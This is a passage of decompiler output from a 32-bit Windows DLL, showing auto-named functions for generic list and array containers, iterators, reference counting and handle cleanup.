  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (100099A2) --------------------------------------------------------
void __thiscall sub_100099A2(_DWORD *this)
{
  int *i; // eax
  int *v3; // edi
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_100FC268;
  v5 = 1;
  for ( i = (int *)this[1]; i; i = v3 )
  {
    v3 = (int *)i[4];
    sub_10009D80(i);
  }
  v5 = -1;
  sub_100059B5(this);
}
// 100FC268: using guessed type int (__thiscall *off_100FC268)(void *, char);

//----- (10009A08) --------------------------------------------------------
void *__thiscall sub_10009A08(void *this, int a2)
{
  sub_10009DE4(a2, (int)this);
  return this;
}

//----- (10009A1A) --------------------------------------------------------
int __thiscall sub_10009A1A(_DWORD *this)
{
  return this[3];
}

//----- (10009A1E) --------------------------------------------------------
_DWORD *__thiscall sub_10009A1E(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_100FC2A8;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_1000728E(a2, (int)v3);
  return a2;
}
// 100FC2A8: using guessed type int (__thiscall *off_100FC2A8)(void *Block, char);

//----- (10009A84) --------------------------------------------------------
_DWORD *__thiscall sub_10009A84(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_100FC2A8;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_1000728E(a2, (int)v3);
  return a2;
}
// 100FC2A8: using guessed type int (__thiscall *off_100FC2A8)(void *Block, char);

//----- (10009AEA) --------------------------------------------------------
_DWORD *__thiscall sub_10009AEA(void *this, _DWORD *a2, unsigned int a3)
{
  int v3; // edi
  unsigned int v5; // eax
  _DWORD *v6; // eax
  int v7; // esi
  int v9; // [esp+Ch] [ebp-14h] BYREF
  int v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+1Ch] [ebp-4h]

  v3 = 0;
  v11 = 0;
  v10 = 0;
  v5 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a3 > v5 )
  {
    v6 = sub_1000E8EF(&a3);
    v11 = 1;
    goto LABEL_3;
  }
  (*(void (__thiscall **)(void *, _DWORD *))(*(_DWORD *)this + 12))(this, a2);
  v11 = 0;
  v10 = 1;
  if ( a3 )
  {
    while ( 1 )
    {
      v7 = *a2;
      if ( (*(unsigned __int8 (__thiscall **)(_DWORD))(*(_DWORD *)*a2 + 4))(*a2) )
        break;
      (*(void (__thiscall **)(int))(*(_DWORD *)v7 + 16))(v7);
      if ( ++v3 >= a3 )
        return a2;
    }
    v6 = sub_1000E8EF(&v9);
    v11 = 2;
LABEL_3:
    sub_100078FE((int)v6);
  }
  return a2;
}

//----- (10009B80) --------------------------------------------------------
int *__thiscall sub_10009B80(void *this, int *a2, unsigned int a3)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  int v6; // ecx
  unsigned int v7; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a3 > v4 )
  {
    v5 = sub_1000E8EF(&a3);
    sub_100078FE((int)v5);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( a3 )
  {
    v7 = a3;
    do
    {
      sub_10009E64(v6, *a2);
      --v7;
    }
    while ( v7 );
  }
  return a2;
}
// 10009BD9: variable 'v6' is possibly undefined

//----- (10009BF4) --------------------------------------------------------
void __thiscall sub_10009BF4(void *this, int a2)
{
  void *v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10007D7A(v2);
}

//----- (10009C32) --------------------------------------------------------
void __thiscall sub_10009C32(void *this, int a2, int a3)
{
  void *v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10007D7A(v3);
}

//----- (10009C73) --------------------------------------------------------
void __thiscall sub_10009C73(void *this, int a2)
{
  void *v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(void *))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10007D7A(v2);
}

//----- (10009CB1) --------------------------------------------------------
int __thiscall sub_10009CB1(void *this, int a2)
{
  int v2; // esi
  void *v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10007D7A(v4);
  return v2;
}

//----- (10009CF5) --------------------------------------------------------
int __thiscall sub_10009CF5(void *this, int a2)
{
  int v2; // esi
  void *v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10007D7A(v4);
  return v2;
}

//----- (10009D39) --------------------------------------------------------
void __thiscall sub_10009D39(void *this)
{
  void *v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(void *))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10007D7A(v1);
}

//----- (10009D80) --------------------------------------------------------
int *__stdcall sub_10009D80(int *Block)
{
  sub_10009DB0(Block);
  j__free(Block);
  return Block;
}

//----- (10009DB0) --------------------------------------------------------
void __stdcall sub_10009DB0(int *a1)
{
  sub_1000D3AD(a1 + 2);
  sub_1000D3AD(a1);
}

//----- (10009DE4) --------------------------------------------------------
void __usercall sub_10009DE4(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  void *v5[3]; // [esp+8h] [ebp-18h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, void **))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_10009E64(v4, (int)v5[0]);
  }
  v6 = -1;
  sub_10007D7A(v5);
}
// 10009E34: variable 'v4' is possibly undefined

//----- (10009E64) --------------------------------------------------------
int __usercall sub_10009E64@<eax>(int a1@<ecx>, int a2@<esi>)
{
  _DWORD *v2; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    v4[0] = 104;
    sub_100078FE((int)v2);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10009EA4) --------------------------------------------------------
BOOL __thiscall sub_10009EA4(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10009EAD) --------------------------------------------------------
int __thiscall sub_10009EAD(_DWORD *this)
{
  int result; // eax
  _DWORD *v2; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  v3[0] = this;
  result = this[3];
  if ( !result )
  {
    v2 = sub_1000E8EF(v3);
    v3[3] = 0;
    sub_100078FE((int)v2);
  }
  return result;
}

//----- (10009EE3) --------------------------------------------------------
int __thiscall sub_10009EE3(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[3];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[3] = result;
  return result;
}

//----- (10009F22) --------------------------------------------------------
int __thiscall sub_10009F22(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 20);
  this[2] = result;
  return result;
}

//----- (10009F61) --------------------------------------------------------
int *__thiscall sub_10009F61(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int *result; // eax
  _DWORD v9[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v9);
    v9[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 16);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 16) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 20) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_10009D80(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10009FE9) --------------------------------------------------------
_DWORD *__thiscall sub_10009FE9(_DWORD *this, void *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[4]; // [esp-18h] [ebp-30h] BYREF
  int v7; // [esp-8h] [ebp-20h]
  int v8; // [esp-4h] [ebp-1Ch]
  int *v9; // [esp+4h] [ebp-14h]
  void *Block; // [esp+8h] [ebp-10h]
  int v11; // [esp+14h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x18u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1000A076(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_1000A0D2(Block, v6[0], v6[1], v6[2], v6[3], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 16) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 20) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (1000A076) --------------------------------------------------------
_DWORD *__thiscall sub_1000A076(void *this, _DWORD *a2)
{
  sub_1000D372(a2, (int)this);
  sub_1000D372(a2 + 2, (int)this + 8);
  return a2;
}

//----- (1000A0D2) --------------------------------------------------------
_DWORD *__stdcall sub_1000A0D2(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7)
{
  sub_1000A076(&a2, a1);
  a1[4] = a6;
  a1[5] = a7;
  sub_10009DB0(&a2);
  return a1;
}

//----- (1000A11B) --------------------------------------------------------
void __thiscall sub_1000A11B(_DWORD *this)
{
  *this = off_100FBF5C;
  *this = &off_100FC268;
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 100FC268: using guessed type int (__thiscall *off_100FC268)(void *, char);

//----- (1000A159) --------------------------------------------------------
bool __thiscall sub_1000A159(_DWORD *this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  *this = off_100FC204;
  v2[6] = 0;
  return sub_1000A926((int)this);
}
// 100FC204: using guessed type int (__thiscall *off_100FC204[2])(void *Block, char);

//----- (1000A198) --------------------------------------------------------
void __thiscall sub_1000A198(
        HANDLE *this,
        HANDLE hSourceHandle,
        char a3,
        BOOL bInheritHandle,
        DWORD dwProcessId,
        DWORD a6)
{
  _DWORD *v7; // eax
  void *v8; // eax
  _DWORD v9[6]; // [esp+Ch] [ebp-18h] BYREF

  if ( this[1] != hSourceHandle && !sub_1000A926((int)this) )
  {
    v7 = sub_1000E9DF(v9, 1, 1);
    v9[5] = 0;
    sub_1000A947(v7, 165);
  }
  if ( a3 )
  {
    sub_10011C23(hSourceHandle, bInheritHandle, dwProcessId);
    this[1] = v8;
  }
  else
  {
    this[1] = hSourceHandle;
  }
}
// 1000A1ED: variable 'v8' is possibly undefined

//----- (1000A205) --------------------------------------------------------
_DWORD *__usercall sub_1000A205@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>)
{
  volatile LONG *v2; // ecx

  v2 = (volatile LONG *)a1[1];
  a2[1] = v2;
  *a2 = *a1;
  InterlockedIncrement(v2);
  return a2;
}

//----- (1000A219) --------------------------------------------------------
_DWORD *__usercall sub_1000A219@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_100081D1((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (1000A23E) --------------------------------------------------------
_DWORD *__userpurge sub_1000A23E@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-18h]
  void *v5; // [esp-4h] [ebp-14h]

  sub_1000A901(a2);
  *a2 = &off_100FC208;
  a2[2] = 1;
  v5 = (void *)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1000A5AB(a2, v2, v4, v5);
  return a2;
}
// 100FC208: using guessed type int (__thiscall *off_100FC208)(void *Block, char);

//----- (1000A292) --------------------------------------------------------
_DWORD *__stdcall sub_1000A292(_DWORD *a1)
{
  sub_1000A901(a1);
  *a1 = &off_100FC208;
  sub_1000A96C(a1, 16);
  return a1;
}
// 100FC208: using guessed type int (__thiscall *off_100FC208)(void *Block, char);

//----- (1000A2CF) --------------------------------------------------------
int *__thiscall sub_1000A2CF(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_10007F50(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (1000A311) --------------------------------------------------------
void *__thiscall sub_1000A311(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_100FC208;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_10007F50(v2);
  this[3] = 0;
  v5 = -1;
  return sub_100059B5(this);
}
// 100FC208: using guessed type int (__thiscall *off_100FC208)(void *Block, char);

//----- (1000A372) --------------------------------------------------------
void __thiscall sub_1000A372(_DWORD *this, int *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  int v8; // [esp+Ch] [ebp-14h] BYREF
  volatile LONG *v9; // [esp+10h] [ebp-10h]
  int v10; // [esp+1Ch] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10142543);
  v9 = (volatile LONG *)a2[1];
  v8 = *a2;
  InterlockedIncrement(v9);
  v10 = 0;
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_1000A219((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  sub_1000A219((_DWORD *)(v7 + 8 * a3), &v8);
  ++this[1];
  v10 = -1;
  sub_1000780D(&v8);
}

//----- (1000A40F) --------------------------------------------------------
int __thiscall sub_1000A40F(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1014257E);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_1000A219((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_1000A219((_DWORD *)(this[3] + 8 * v4), dword_10193B8C);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193B8C: using guessed type _DWORD dword_10193B8C[3];

//----- (1000A466) --------------------------------------------------------
int __thiscall sub_1000A466(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1014257F);
  return this[3] + 8 * a2;
}

//----- (1000A484) --------------------------------------------------------
int __thiscall sub_1000A484(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1014267A);
  return this[3] + 8 * a2;
}

//----- (1000A4A2) --------------------------------------------------------
char *__thiscall sub_1000A4A2(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_10007F50(v3);
  }
  return result;
}

//----- (1000A4C8) --------------------------------------------------------
int __thiscall sub_1000A4C8(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_10007F50(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1000A4EF) --------------------------------------------------------
int __thiscall sub_1000A4EF(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    sub_1000A219((_DWORD *)(this[3] + 8 * i), dword_10193B8C);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 10193B8C: using guessed type _DWORD dword_10193B8C[3];

//----- (1000A539) --------------------------------------------------------
unsigned int __thiscall sub_1000A539(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1014267B);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1000A5AB) --------------------------------------------------------
unsigned int __thiscall sub_1000A5AB(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_1000A845, sub_1000780D);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_1000A219((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (1000A65B) --------------------------------------------------------
void *__thiscall sub_1000A65B(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  int *v8; // eax
  _DWORD *v9; // edi
  _DWORD *v10; // ebx
  char *i; // eax
  char *v12; // [esp+Ch] [ebp-1Ch]
  int v13; // [esp+10h] [ebp-18h]
  _DWORD *v14; // [esp+14h] [ebp-14h]
  unsigned int v15; // [esp+18h] [ebp-10h]

  result = &loc_100A398C;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v13 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v12 = (char *)this[3];
      v7 = (unsigned __int64)(unsigned int)v13 >> 29 != 0 ? -1 : 8 * v13;
      v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
      if ( v8 )
      {
        v9 = v8 + 1;
        *v8 = v13;
        `eh vector constructor iterator'(v8 + 1, 8u, v13, (void (__thiscall *)(void *))sub_1000A845, sub_1000780D);
        v14 = v9;
      }
      else
      {
        v14 = 0;
      }
      v15 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v10 = v14;
        for ( i = (char *)(v12 - (char *)v14); ; i = (char *)(v12 - (char *)v14) )
        {
          sub_1000A219(v10, (_DWORD *)((char *)v10 + (_DWORD)i));
          ++v15;
          v10 += 2;
          if ( v15 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
        }
      }
      this[3] = v14;
      if ( v12 )
        sub_10007F50(v12);
      result = (void *)v13;
      this[2] = v13;
    }
  }
  return result;
}

//----- (1000A771) --------------------------------------------------------
void sub_1000A771()
{
  _DWORD v0[7]; // [esp+0h] [ebp-1Ch] BYREF

  v0[3] = v0;
  v0[6] = 0;
  sub_1000A9D9();
}

//----- (1000A7A8) --------------------------------------------------------
volatile LONG *__usercall sub_1000A7A8@<eax>(int a1@<esi>)
{
  volatile LONG *result; // eax

  result = (volatile LONG *)&loc_100B012F;
  if ( dword_1018686C != a1 )
  {
    sub_1000A9D9();
    result = (volatile LONG *)operator new(4u);
    if ( result )
      *result = 1;
    else
      result = 0;
    Block = result;
    dword_1018686C = a1;
  }
  return result;
}
// 1018686C: using guessed type int dword_1018686C;

//----- (1000A7F8) --------------------------------------------------------
_DWORD *__thiscall sub_1000A7F8(_DWORD *Block, char a2)
{
  sub_1000A159(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000A814) --------------------------------------------------------
void __thiscall sub_1000A814(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // ecx

  v1 = *(_DWORD *)(*this + 4);
  v2 = this + 2;
  *(_DWORD *)((char *)v2 + v1 - 8) = &off_100FC1F4;
  sub_1000E843(v2);
}
// 100FC1F4: using guessed type int (__stdcall *off_100FC1F4)(char);

//----- (1000A829) --------------------------------------------------------
_DWORD *__thiscall sub_1000A829(_DWORD *Block, char a2)
{
  sub_1000A311(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000A845) --------------------------------------------------------
void __thiscall sub_1000A845(_DWORD *this)
{
  sub_1000728E(this, 0);
}

//----- (1000A851) --------------------------------------------------------
char *__thiscall sub_1000A851(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 0x10u, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_100099A2);
    if ( (a2 & 1) != 0 )
      j_j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_100099A2(Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}

//----- (1000A89A) --------------------------------------------------------
char *__usercall sub_1000A89A@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 8u, *((_DWORD *)a1 - 1), sub_1000780D);
  j_j__free(v1);
  return v1;
}

//----- (1000A8B8) --------------------------------------------------------
char *__thiscall sub_1000A8B8(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 0x14u, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_1000B3DF);
    if ( (a2 & 1) != 0 )
      j_j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_1000B3DF((int *)Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}

//----- (1000A901) --------------------------------------------------------
_DWORD *__stdcall sub_1000A901(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_100FBF5C;
  return result;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);

//----- (1000A926) --------------------------------------------------------
bool __usercall sub_1000A926@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_1000AA9A(a1) )
    return 1;
  result = CloseHandle(*(HANDLE *)(a1 + 4));
  *(_DWORD *)(a1 + 4) = -1;
  return result;
}

//----- (1000A947) --------------------------------------------------------
void __cdecl __noreturn sub_1000A947(_DWORD *a1, int a2)
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_1000AA0A(pExceptionObject, a1, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
}
// 1000A947: using guessed type _DWORD pExceptionObject[3];

//----- (1000A96C) --------------------------------------------------------
void __usercall sub_1000A96C(_DWORD *a1@<edi>, int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (unsigned __int64)(unsigned int)a2 >> 29 != 0 ? -1 : 8 * a2;
  v4 = (int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(v4 + 1, 8u, a2, (void (__thiscall *)(void *))sub_1000A845, sub_1000780D);
  }
  a1[3] = v2;
}

//----- (1000A9D9) --------------------------------------------------------
void sub_1000A9D9()
{
  if ( !InterlockedDecrement(Block) )
  {
    if ( Block )
      j__free((void *)Block);
    if ( dword_1018686C )
      (**(void (__thiscall ***)(int, int))dword_1018686C)(dword_1018686C, 1);
  }
}
// 1018686C: using guessed type int dword_1018686C;

//----- (1000AA0A) --------------------------------------------------------
_DWORD *__thiscall sub_1000AA0A(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
